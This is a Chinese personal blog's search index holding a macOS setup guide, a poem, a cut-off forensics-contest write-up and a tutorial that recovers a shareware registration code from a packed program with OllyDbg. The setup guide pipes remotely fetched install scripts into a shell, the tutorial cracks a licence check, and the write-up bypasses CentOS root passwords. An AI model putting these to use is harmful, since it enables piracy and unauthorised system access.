<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>MacOS开发环境的配置</title>
    <url>/MacOS%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E7%9A%84%E9%85%8D%E7%BD%AE.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>因为以后要转战MacOS了，虽然之前也用过一年的Ubuntu实体机，但是Windows的环境和MacOS的开发环境相差还是蛮大，所以一切都得从头开始了…<br>按照我的尿性，估计这种配环境的事以后还得干不少次，为了以后方便，这次把中间采的坑记录下来…</p>
<h3 id="Home-Brew"><a href="#Home-Brew" class="headerlink" title="Home_Brew"></a>Home_Brew</h3><p>安装过程有点烦，安装之后还要考虑换源或者走代理的方式。</p>
<p>安装过程：</p>
<figure class="highlight vim"><table><tbody><tr><td class="code"><pre><span class="line">xcode-select --install</span><br><span class="line"></span><br><span class="line">第一种方法：</span><br><span class="line"></span><br><span class="line">首先用的是官方的安装方法，但是总是连接不上，或者下载到一半就断开，因为节点在国外的原因；</span><br><span class="line">http<span class="variable">s:</span>//brew.<span class="keyword">sh</span>/index_zh-<span class="keyword">cn</span>.html</span><br><span class="line"></span><br><span class="line">安装脚本：</span><br><span class="line">/bin/bash -<span class="keyword">c</span> <span class="string">"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">实际上如果卡在git clone的某一个部分，可以把终端命令停下来，然后尝试一下：</span><br><span class="line"></span><br><span class="line">git clone gi<span class="variable">t:</span>//mirrors.ustc.edu.<span class="keyword">cn</span>/homebrew-core.git/ /usr/local/Homebrew/Library/Taps/homebrew/homebrew-core --depth=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">/bin/bash -<span class="keyword">c</span> <span class="string">"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">下载失败报错之后尝试</span><br><span class="line">第二种办法：</span><br><span class="line"></span><br><span class="line">为了防止出错，先把之前安装到一半的brew卸载了：</span><br><span class="line">/usr/bin/<span class="keyword">ruby</span> -<span class="keyword">e</span> <span class="string">"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/uninstall)"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">curl -fsSL http<span class="variable">s:</span>//raw.githubusercontent.<span class="keyword">com</span>/Homebrew/install/master/install.<span class="keyword">sh</span> &gt;&gt; brew_install.<span class="keyword">sh</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">vim</span> brew_install.<span class="keyword">sh</span></span><br><span class="line"></span><br><span class="line">将文件中的</span><br><span class="line">BREW_REPO=<span class="string">"https://github.com/Homebrew/brew"</span></span><br><span class="line">改为</span><br><span class="line">BREW_REPO=<span class="string">"https://mirrors.ustc.edu.cn/brew.git"</span></span><br><span class="line">CORE_TAP_REPO=<span class="string">"https://mirrors.ustc.edu.cn/homebrew-core.git"</span></span><br><span class="line"></span><br><span class="line">运行：</span><br><span class="line">/bin/bash brew_install.<span class="keyword">sh</span></span><br><span class="line"></span><br><span class="line">如果出现下面这种下载速度慢或者卡住的情况，把终端停掉，使用浏览器打开那个链接进行下载，比如这里是 http<span class="variable">s:</span>//homebrew.bintray.<span class="keyword">com</span>/bottles-portable-<span class="keyword">ruby</span>/portable-<span class="keyword">ruby</span>-<span class="number">2.6</span>.<span class="number">3</span>.mavericks.bottle.tar.gz，下载完成后将该文件放进 /Users/$你的用户名/Library/Caches/Homebrew 中。</span><br><span class="line"></span><br><span class="line">==&gt; Downloading http<span class="variable">s:</span>//homebrew.bintray.<span class="keyword">com</span>/bottles-portable-<span class="keyword">ruby</span>/portable-<span class="keyword">ruby</span>-<span class="number">2.6</span>.<span class="number">3</span>.mavericks.bottle.tar.gz</span><br><span class="line">############### <span class="number">21.6</span>%</span><br><span class="line"></span><br><span class="line">重新运行安装指令。</span><br><span class="line"></span><br><span class="line">/bin/bash brew_install.<span class="keyword">sh</span></span><br><span class="line"></span><br><span class="line">如果安装过程中卡在了 Clone 什么的地方不动了，则停掉终端，运行下列指令。</span><br><span class="line"></span><br><span class="line">git clone gi<span class="variable">t:</span>//mirrors.ustc.edu.<span class="keyword">cn</span>/homebrew-core.git/ /usr/local/Homebrew/Library/Taps/homebrew/homebrew-core --depth=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">执行完上述指令，再重新运行安装指令。</span><br><span class="line"></span><br><span class="line">/bin/bash brew_install.<span class="keyword">sh</span></span><br><span class="line"></span><br><span class="line">安装完成。</span><br><span class="line"></span><br><span class="line">第三种方法：</span><br><span class="line"></span><br><span class="line">利用中科大的源：</span><br><span class="line"></span><br><span class="line">/usr/bin/<span class="keyword">ruby</span> -<span class="keyword">e</span> <span class="string">"$(curl -fsSL https://cdn.jsdelivr.net/gh/ineo6/homebrew-install/install)"</span></span><br><span class="line">如果命令执行中卡在下面信息：</span><br><span class="line"></span><br><span class="line">==&gt; Tapping homebrew/core</span><br><span class="line">Cloning into <span class="string">'/usr/local/Homebrew/Library/Taps/homebrew/homebrew-core'</span>...</span><br><span class="line"></span><br><span class="line">请Control + C中断脚本执行如下命令：</span><br><span class="line"></span><br><span class="line"><span class="keyword">cd</span> <span class="string">"$(brew --repo)/Library/Taps/"</span></span><br><span class="line"><span class="built_in">mkdir</span> homebrew &amp;&amp; <span class="keyword">cd</span> homebrew</span><br><span class="line">git clone gi<span class="variable">t:</span>//mirrors.ustc.edu.<span class="keyword">cn</span>/homebrew-core.git</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">打开新的终端：</span><br><span class="line">brew doctor</span><br></pre></td></tr></tbody></table></figure>

<p>常用的Brew的一些命令：</p>
<figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">brew install &lt;package name&gt; <span class="regexp">//</span>安装一个包</span><br><span class="line">brew upgrate &lt;package name&gt; <span class="regexp">//</span>更新一个包</span><br><span class="line">brew update <span class="regexp">//</span>更新 Homebrew 在服务器端上的包目录</span><br><span class="line">brew upgrade <span class="regexp">//</span>以本地目录更新本地的包</span><br><span class="line">brew list --versions <span class="regexp">//</span>查看安装过的包版本</span><br></pre></td></tr></tbody></table></figure>

<h3 id="Brew-cask"><a href="#Brew-cask" class="headerlink" title="Brew_cask"></a>Brew_cask</h3><p>brew 装的主要是 command line tool。<br>brew cask装的大多是有gui界面的app以及驱动，brew cask是brew的一个官方源。<br>brew cask 是 已经编译好了的应用包 （.dmg/.pkg），仅仅是下载解压，放在统一的目录中（/opt/homebrew-cask/Caskroom）</p>
<p>brew_cask 原理：<br>之前，是用软链接的方式将应用链接到 Application 文件夹，有人说这样的方式会导致 Spotlight 无法检索到。但现在，它是将应用直接移动到 Application 文件夹，这与我们自己去官网下载应用再安装是完全一致的，后续更新或卸载也按平常的方式即可。</p>
<p>当然，也可以用 brew cask uninstall 应用名称 的方式，这种方式才会删除路径 /usr/local/Caskroom 中保留的应用信息文件，这样当我们用命令 brew cask list 查询已安装列表时，已卸载的应用才不会仍显示。也就是说，如果按照平常的方式，比如直接移到废纸篓，那么还需手动删除 Caskroom 中的应用信息文件。当然，不删除也没啥影响，因为一般没必要查看已安装列表，已安装应用在 Launchpad 中查看就好。</p>
<p>二者并无竞争关系，所以也不存在你说的更推荐brew cask。brew装的东西比较偏向开发，而brew cask装的东西会相对生活化一些。</p>
<p>大体安装步骤是：xcode—homebrew—homebrew cask</p>
<p>接下来安装Brew_cask:</p>
<figure class="highlight dsconfig"><table><tbody><tr><td class="code"><pre><span class="line"><span class="string">brew </span><span class="string">tap </span><span class="string">homebrew/</span><span class="string">cask-cask </span> // 添加 <span class="string">Github </span>上的 <span class="string">caskroom/</span><span class="string">cask </span>库</span><br><span class="line"><span class="string">brew </span><span class="string">install </span><span class="string">brew-cask </span> // 安装 <span class="string">brew-cask</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">如</span>果遇到卡在克隆界面：</span><br><span class="line"></span><br><span class="line"><span class="string">cd </span><span class="string">"$(brew --repo)/Library/Taps/"</span></span><br><span class="line"><span class="string">cd </span><span class="string">homebrew</span></span><br><span class="line"><span class="string">git </span><span class="string">clone </span><span class="string">https:</span>//<span class="string">mirrors.</span><span class="string">ustc.</span><span class="string">edu.</span><span class="string">cn/</span><span class="string">homebrew-cask.</span><span class="string">git</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">brew </span><span class="string">update </span>&amp;&amp; <span class="string">brew </span><span class="string">upgrade </span><span class="string">brew-cask </span>&amp;&amp; <span class="string">brew </span><span class="string">cleanup </span>// 更新</span><br><span class="line"></span><br><span class="line">更换中科大源：</span><br><span class="line"></span><br><span class="line"><span class="string">git </span>-C <span class="string">"$(brew --repo)"</span> <span class="string">remote </span><span class="built_in">set-url</span> <span class="string">origin </span><span class="string">https:</span>//<span class="string">mirrors.</span><span class="string">ustc.</span><span class="string">edu.</span><span class="string">cn/</span><span class="string">brew.</span><span class="string">git</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">git </span>-C <span class="string">"$(brew --repo homebrew/core)"</span> <span class="string">remote </span><span class="built_in">set-url</span> <span class="string">origin </span><span class="string">https:</span>//<span class="string">mirrors.</span><span class="string">ustc.</span><span class="string">edu.</span><span class="string">cn/</span><span class="string">homebrew-core.</span><span class="string">git</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">git </span>-C <span class="string">"$(brew --repo homebrew/cask)"</span> <span class="string">remote </span><span class="built_in">set-url</span> <span class="string">origin </span><span class="string">https:</span>//<span class="string">mirrors.</span><span class="string">ustc.</span><span class="string">edu.</span><span class="string">cn/</span><span class="string">homebrew-cask.</span><span class="string">git</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">brew </span><span class="string">update</span></span><br></pre></td></tr></tbody></table></figure>


<h3 id="Python3"><a href="#Python3" class="headerlink" title="Python3"></a>Python3</h3><figure class="highlight routeros"><table><tbody><tr><td class="code"><pre><span class="line">brew install python</span><br><span class="line"></span><br><span class="line">根据安装路径的一些问题：</span><br><span class="line"></span><br><span class="line">配置   ~/.bash_profile</span><br><span class="line"></span><br><span class="line">➜  ~ cat ~/.bash_profile</span><br><span class="line"><span class="comment"># Setup System PATH</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Python 2.7</span></span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">PATH</span>=<span class="string">"/System/Library/Frameworks/Python.framework/Versions/2.7/bin:<span class="variable">$PATH</span>"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pip</span></span><br><span class="line"><span class="comment"># /usr/local/bin/目录下的pip指向Python2.7，所以不修改系统路径</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Python 3.8</span></span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">PATH</span>=<span class="string">"/usr/local/Cellar/python@3.8/3.8.5/bin:<span class="variable">$PATH</span>"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pip3</span></span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">PATH</span>=<span class="string">"/usr/local/Cellar/python@3.8/3.8.5/bin:<span class="variable">$PATH</span>"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Alias Command</span></span><br><span class="line"></span><br><span class="line">alias <span class="attribute">python</span>=<span class="string">'python2'</span></span><br><span class="line">alias <span class="attribute">python3</span>=<span class="string">'python3.8'</span></span><br><span class="line">alias <span class="attribute">python2</span>=<span class="string">'python2'</span></span><br><span class="line">alias <span class="attribute">subl</span>=<span class="string">"'/Applications/Sublime Text.app/Contents/SharedSupport/bin/subl'"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">删除 /usr/local/bin/目录下的pip3 和 pip3.8   因为该目录下的这三个pip全部指向的是：python2的 pip。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查看Python的安装路径：</span><br><span class="line"></span><br><span class="line">which Python</span><br><span class="line">which python2</span><br><span class="line">which python3</span><br><span class="line"></span><br><span class="line">调用python的时候默认使用的￥PATH中的从左到右的顺序调用。</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<h3 id="on-my-zsh的安装"><a href="#on-my-zsh的安装" class="headerlink" title="on_my_zsh的安装"></a>on_my_zsh的安装</h3><figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">参考官方网站的安装方式：</span><br><span class="line"></span><br><span class="line"><span class="comment"># curl</span></span><br><span class="line">sh -c <span class="string">"$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># wegt </span></span><br><span class="line">sh -c <span class="string">"$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)"</span></span><br><span class="line"></span><br><span class="line">重启终端，查看当前终端：</span><br><span class="line">echo <span class="variable">$SHELL</span></span><br><span class="line">查看已有终端：</span><br><span class="line">cat <span class="regexp">/etc/</span>shell</span><br><span class="line">更换终端：</span><br><span class="line">chsh -s <span class="regexp">/bin/</span>zsh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">主题的更换：</span><br><span class="line">查看自带主题：</span><br><span class="line">ls .oh-my-zsh/themes</span><br><span class="line">这里选择的是自带的默认主题，因为这个最好看。。。。</span><br><span class="line"></span><br><span class="line">常用的插件安装：</span><br><span class="line"></span><br><span class="line">incr:</span><br><span class="line">自动补全命令</span><br><span class="line">wget http:<span class="regexp">//mim</span>osa-pudica.net<span class="regexp">/src/i</span>ncr-<span class="number">0.2</span>.zsh</span><br><span class="line">mkdir ~<span class="regexp">/.oh-my-zsh/</span>plugins/incr</span><br><span class="line">mv incr-<span class="number">0.2</span>.zsh ~<span class="regexp">/.oh-my-zsh/</span>plugins/incr</span><br><span class="line">echo <span class="string">'source ~/.oh-my-zsh/plugins/incr/incr*.zsh'</span> &gt;&gt; ~/.zshrc</span><br><span class="line">source ~/.zshrc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">zsh-autosuggestions：</span><br><span class="line">根据历史命令自动补全插件</span><br><span class="line"></span><br><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/zsh-users/</span>zsh-autosuggestions <span class="variable">$ZSH_CUSTOM</span><span class="regexp">/plugins/</span>zsh-autosuggestions</span><br><span class="line">vim ~/.zshrc</span><br><span class="line"><span class="comment"># 加入插件列表</span></span><br><span class="line">plugins=(</span><br><span class="line">  git</span><br><span class="line">  zsh-autosuggestions</span><br><span class="line">)</span><br><span class="line">执行：</span><br><span class="line">source ~/.zshrc</span><br><span class="line"></span><br><span class="line">autojump:</span><br><span class="line">目录跳转插件：</span><br><span class="line"></span><br><span class="line">brew install autojump</span><br><span class="line">echo <span class="string">'[[ -s $(brew --prefix)/etc/profile.d/autojump.sh ]] &amp;&amp; . $(brew --prefix)/etc/profile.d/autojump.sh'</span> &gt;&gt; ~/.zshrc</span><br><span class="line">source ~/.zshrc</span><br><span class="line"></span><br><span class="line">例如：jo te <span class="regexp">//</span>打开Finder</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">zsh-syntax-highlighting</span><br><span class="line">可执行代码自动高亮：主要用于提高颜值</span><br><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/zsh-users/</span>zsh-syntax-highlighting.git <span class="variable">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span><span class="regexp">/plugins/</span>zsh-syntax-highlighting</span><br><span class="line">vim ~/.zshrc</span><br><span class="line"><span class="comment"># 加入插件列表</span></span><br><span class="line">plugins=(</span><br><span class="line">  git</span><br><span class="line">  zsh-autosuggestions</span><br><span class="line">  zsh-syntax-highlighting</span><br><span class="line">)</span><br><span class="line">source ~/.zshrc</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>


<h3 id="Home-brew-走代理："><a href="#Home-brew-走代理：" class="headerlink" title="Home_brew 走代理："></a>Home_brew 走代理：</h3><p>在  ~/.zshrc  里面添加：</p>
<figure class="highlight routeros"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># where proxy</span></span><br><span class="line">proxy () {</span><br><span class="line">  <span class="builtin-name">export</span> <span class="attribute">all_proxy</span>=socks5://localhost:port</span><br><span class="line">  echo <span class="string">"HTTP Proxy on"</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment"># where noproxy</span></span><br><span class="line">noproxy () {</span><br><span class="line">  unset all_proxy</span><br><span class="line">  echo <span class="string">"HTTP Proxy off"</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">执行；</span><br><span class="line">source ~/.zshrc</span><br><span class="line"></span><br><span class="line">测试：</span><br><span class="line">curl cip.cc</span><br></pre></td></tr></tbody></table></figure>



<h3 id="Sublime-Text3-插件："><a href="#Sublime-Text3-插件：" class="headerlink" title="Sublime Text3 插件："></a>Sublime Text3 插件：</h3><p>安装过程不言，插件列表如下：</p>
<figure class="highlight mipsasm"><table><tbody><tr><td class="code"><pre><span class="line">AutoFileName</span><br><span class="line"><span class="keyword">JsFormat</span></span><br><span class="line"><span class="keyword">SublimeCodeIntel</span></span><br><span class="line"><span class="keyword">ConvertToUTF8</span></span><br><span class="line"><span class="keyword">BracketHighlight</span></span><br><span class="line"><span class="keyword">markdown </span>preview</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>环境配置</tag>
        <tag>macOS</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向1-2 带壳破解，获取注册码</title>
    <url>/1-2-%E5%B8%A6%E5%A3%B3%E7%A0%B4%E8%A7%A3%EF%BC%8C%E8%8E%B7%E5%8F%96%E6%B3%A8%E5%86%8C%E7%A0%81.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><p>首先使用查壳软件PEiD v0.98，查看下我们要破解的软件是否加壳了：</p>
<p><img src="/images/pasted-101.png" alt="upload successful"></p>
<p>可以看到软件使用ASPack 2.12进行了加壳。虽然ASP压缩壳是可以直接用esp定律脱壳的。但是本次我们暂时不进行脱壳，直接破解，获取软件的注册码。</p>
<p>注意加壳的软件修改之后是不能保存的，只能通过脱壳之后在保存，或者是使用打补丁的方式。</p>
<p>运行软件：</p>
<p><img src="/images/pasted-81.png" alt="upload successful"></p>
<p>软件标题栏提示为购买用户，点击购买，输入用户名和注册码：lzx，1111111111111111111111，然后点击注册验证，软件提示重启软件进行验证：</p>
<p><img src="/images/pasted-82.png" alt="upload successful"></p>
<p>能够得出的结论是，这是一款重启验证软件，本次我们输入用户名和注册码之后，软件会先将这两个参数存储，在软件重启的时候，会读取这两个值，进行验证。注意，这两个值可能存在软件安装目录的文件夹下，或者是被写入到注册表中。然后点击确定，软件退出。<br>使用OD载入软件，提示软件代码段可能被压缩，证明软件被加了壳：</p>
<p><img src="/images/pasted-83.png" alt="upload successful"></p>
<p>点击确定或者取消进入OD，接着，F9运行软件，然后Ctrl+G，跟随表达式到“0X00401000”处：</p>
<p>注意：401000是该程序的基址，不是所有的程序都是在0X401000处，但是大部分的文件基址都是在这里。<br>windows7系统的程序是默认开启了基址随机化，另外，针对dll和exe两种文件格式，他们的基址也是不一样的。</p>
<p>如何寻找一个基址：ALT+M，找到打开文件的PE文件头所在，单击进入就是此时的文件基址。</p>
<p>如何关闭给定程序的基址随机化：使用LoadPE打开文件，“特征值”，“重定位已分离”，确定保存。</p>
<p><img src="/images/pasted-84.png" alt="upload successful"></p>
<p><img src="/images/pasted-85.png" alt="upload successful"></p>
<p>加壳程序包括解码和未解码两部分，要是出现了上图的情况，说明程序已解码，只需要在反汇编窗口中右键-&gt;分析-&gt;从模块中删除分析：<br>未解码的汇编语句显示的是： add  byte  XXXXXXX</p>
<p><img src="/images/pasted-86.png" alt="upload successful"></p>
<p><img src="/images/pasted-87.png" alt="upload successful"></p>
<p>到上图所示的界面，基本上就能判断程序已经加压缩了，脱去了壳。<br>脱去壳之后，就来到了代码段，选择搜索字符串，智能搜索，关键字：未购买</p>
<p><img src="/images/pasted-88.png" alt="upload successful"></p>
<p>双击未购买用户，转入反汇编窗口，查找代码上文的内容，看没有关键跳和关键CALL，很巧，找到一个读取注册表的代码：</p>
<p><img src="/images/pasted-89.png" alt="upload successful"></p>
<p>在注册表出下断点，初步判断软件在重启的时候，在这个代码处读取注册表中的数据，也就是用户输入的用户名和注册码。下断点之后，重新载入程序，程序会提示断点丢失，这是因为程序加了壳的缘故，不要紧，断点在B标签中能够查看到。而这就是不脱壳调试的技巧所在。</p>
<p><img src="/images/pasted-90.png" alt="upload successful"></p>
<p>然后设置API断点，菜单栏-&gt;插件-&gt;API断点设置工具-&gt;常用断点设置：</p>
<p><img src="/images/pasted-91.png" alt="upload successful"></p>
<p>GetStartupInfoA：程序已经解码，但是还没有运行起来。</p>
<p>这个断点会在程序解码之后，但是还没有运行起来的时候中断。这个时候程序还没有进行注册码的判断，所以在这个时候设置断点。然后F9运行程序，程序在断点处停下：</p>
<p><img src="/images/pasted-92.png" alt="upload successful"></p>
<p>切换到断点窗口：</p>
<p><img src="/images/pasted-94.png" alt="upload successful"></p>
<p>将之前的读取注册表的断点激活，禁止掉初始化的断点。<br>然后F9运行程序，程序停在了读取注册表的地方：</p>
<p><img src="/images/pasted-95.png" alt="upload successful"></p>
<p>然后我们单步执行F8，注意观察CPU寄存器和堆栈窗口中的数据，能够看到读取的我们之前填入的用户名和注册码，以及软件根据我们用户名生成的正确的注册码：</p>
<p><img src="/images/pasted-96.png" alt="upload successful"></p>
<p><img src="/images/pasted-97.png" alt="upload successful"></p>
<p>继续向下执行：</p>
<p><img src="/images/pasted-98.png" alt="upload successful"></p>
<p>这个注册码就是对应我们用户名正确的注册码了，记录下来，等会进入软件进行注册。<br>程序后面就是进行注册码的对比了，会有关键CALL和关键跳，但是程序加了壳，我们无法保存修改，所以暂时不用这种方法，（加壳程序可以通过打补丁的方式爆破），我们使用正确的注册码使用软件。<br>关闭OD，使用之前的用户名和现在正确的注册码进行注册：</p>
<p><img src="/images/pasted-100.png" alt="upload successful"></p>
<p>总结：<br>1.很多软件都会加壳，使用PEiD v0.98进行查壳；<br>2.软件未脱壳的情况下，需要先F9运行软件，让加壳的程序解码之后，才能做后面的下断点，动态调试之类操作；<br>3.很多软件都使用重启验证的方式，这些信息一般会存在软件的安装目录的配置文件中或者是注册表中；<br>4.找到读取注册表或者配置文件的代码段，单步执行，注意观察CPU寄存器窗口和堆栈窗口，软件会根据用户名生成正确的注册码，注意多单步运行几次，记录下所有敏感的字符串。</p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>破解</tag>
      </tags>
  </entry>
  <entry>
    <title>记得旧事好</title>
    <url>/%E6%97%A7%E4%BA%8B%E5%A5%BD.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><p><img src="/images/pasted-38.png" alt="upload successful"></p>
<pre><code>                              《记得旧时好》（陈白沙）</code></pre>
<p>记得旧时好，跟随爹爹去吃茶，门前磨螺壳，巷口弄泥沙，而今人长大，心事乱如麻；</p>
<p>记得旧时遥，喜看阿婆纺线纱，瓦凹泡新茧，院内惹雏鸭，而今人长大，心绪淡若茶；</p>
<p>记得旧时小，爱卷丫小衣襟角，檐底蹲蚁巢，树上共攀枣，而今人长大，心情恍比潮；</p>
<p>记得旧时淘，总嫌先生讲乖巧，车马混鱼龙，睁眼乐妖娆，而今人长大，心思飘成草；</p>
<p>记得旧时闹，偏要哥哥教捉虾，墙角挖青苔，梢头斗知了，而今人长大，心湖荡起潮；</p>
<p>想如今，天高海阔音信杳杳，沧桑岁月间抹不平凄凉寂寥。</p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>那些花儿</category>
      </categories>
      <tags>
        <tag>怀想</tag>
      </tags>
  </entry>
  <entry>
    <title>安徽取证大比武个人Writeup</title>
    <url>/%E8%AE%B0%E5%BD%95%E5%AE%89%E5%BE%BD%E6%9F%90%E4%B8%80%E6%AC%A1%E5%8F%96%E8%AF%81%E7%BB%83%E4%B9%A0.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="案件背景："><a href="#案件背景：" class="headerlink" title="案件背景："></a>案件背景：</h3><p>经市民举报，近期经常受到中介的骚扰，办案单位进而对被举报的中介进行审讯，发现他们手上的信息来源都来自于某网站的后台管理员陈某。经查受骚扰的市民都有在该网站注册过信息。锁定嫌疑人后，办案人员迅速对嫌疑人进行了控制，经了解，陈某6月24日中午已经从该公司离职，其声称没办法接触到服务器更不能拿到公民信息。</p>
<p>案例中，镜像为嫌疑人陈某的笔记本电脑硬盘镜像，虚拟机为该网站后台服务器，请对镜像和服务器进行分析，固定嫌疑人在离职前后的可疑痕迹。</p>
<h3 id="检材："><a href="#检材：" class="headerlink" title="检材："></a>检材：</h3><h5 id="Centos7-64位的虚拟机文件一份"><a href="#Centos7-64位的虚拟机文件一份" class="headerlink" title="Centos7 64位的虚拟机文件一份"></a>Centos7 64位的虚拟机文件一份</h5><p>很惊喜地发现有一份快照（比武起点）</p>
<h5 id="犯罪嫌疑人笔记本电脑E01镜像一份"><a href="#犯罪嫌疑人笔记本电脑E01镜像一份" class="headerlink" title="犯罪嫌疑人笔记本电脑E01镜像一份"></a>犯罪嫌疑人笔记本电脑E01镜像一份</h5><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><h5 id="1-分别列出服务器的系统类型，版本号，定时任务情况；（5分）"><a href="#1-分别列出服务器的系统类型，版本号，定时任务情况；（5分）" class="headerlink" title="1.分别列出服务器的系统类型，版本号，定时任务情况；（5分）"></a>1.分别列出服务器的系统类型，版本号，定时任务情况；（5分）</h5><p>打开虚拟机发现需要密码，直接绕掉</p>
<p>顺便记录一下Centos6和Centos7的密码绕过方法：</p>
<h6 id="Centos6密码绕过"><a href="#Centos6密码绕过" class="headerlink" title="Centos6密码绕过"></a>Centos6密码绕过</h6><figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">启动时任意键暂停启动&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;</span><br><span class="line">按a键进入编辑模式 </span><br><span class="line">按S键进入单用户模式</span><br><span class="line">passwd root</span><br><span class="line"><span class="keyword">exit</span></span><br><span class="line">reboot</span><br></pre></td></tr></tbody></table></figure>

<h6 id="Centos7密码绕过"><a href="#Centos7密码绕过" class="headerlink" title="Centos7密码绕过"></a>Centos7密码绕过</h6><figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">方法一：</span><br><span class="line"></span><br><span class="line">启动时任意键暂停启动&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;</span><br><span class="line">按e键进入编辑模式&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;</span><br><span class="line">将光标移动到linux16开始的行，将ro改为rw init=<span class="regexp">/sysroot/</span>bin/sh&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;</span><br><span class="line">按Ctrl-x启动&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;</span><br><span class="line">chroot /sysroot&nbsp;</span><br><span class="line">LANG=en（如果出现乱码）</span><br><span class="line">passwd root&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;</span><br><span class="line">touch /.autorelabel&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; <span class="comment"># (如果你系统没有开启selinux，那么可以不做这一步)&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;</span></span><br><span 